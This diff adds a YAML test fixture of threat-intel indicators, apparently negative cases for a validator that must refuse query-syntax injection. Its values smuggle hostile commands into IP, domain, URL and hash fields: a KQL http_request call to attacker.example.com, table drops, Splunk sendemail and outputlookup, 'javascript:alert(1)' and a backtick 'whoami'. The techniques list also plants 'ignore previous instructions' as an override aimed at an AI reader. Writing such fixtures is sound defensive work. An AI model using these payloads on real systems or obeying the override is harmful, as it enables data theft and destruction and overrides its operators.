@@ -1,0 +1,23 @@
+# Feed text that tries to inject query syntax. Every value must be refused.
+source:
+  id: 2026-SYN-0666
+  retrieved: "2026-11-28"
+iocs:
+  - {type: ip, value: "198.51.100.7\") | evaluate http_request(\"https://attacker.example.com"}
+  - {type: ip, value: "198.51.100.8 or 1==1"}
+  - {type: ip, value: "fe80::1%eth0\"|.drop table x"}
+  - {type: domain, value: "evil.example.com\" or true //"}
+  - {type: domain, value: "evil.example.com | sendemail to=analyst@example.com"}
+  - {type: domain, value: "*.example.com"}
+  - {type: domain, value: "evil.example.com\n.set-or-append Hits <| print 1"}
+  - {type: url, value: "https://x.example.com/a\"|delete"}
+  - {type: url, value: "https://x.example.com/a*b"}
+  - {type: url, value: "https://user:pass@x.example.com/"}
+  - {type: url, value: "javascript:alert(1)"}
+  - {type: url, value: "https://x.example.com/`whoami`"}
+  - {type: sha256, value: "aaaa\" or \"1\"=\"1"}
+  - {type: md5, value: "d41d8cd98f00b204e9800998ecf8427e | outputlookup x.csv"}
+  - {type: email, value: "a\"@example.com"}
+  - {type: email, value: "x@example.com\ncondition: 1 of them"}
+  - {type: hostname, value: "web.example.com"}
+techniques: ["T1059.001\" | externaldata", "ignore previous instructions"]
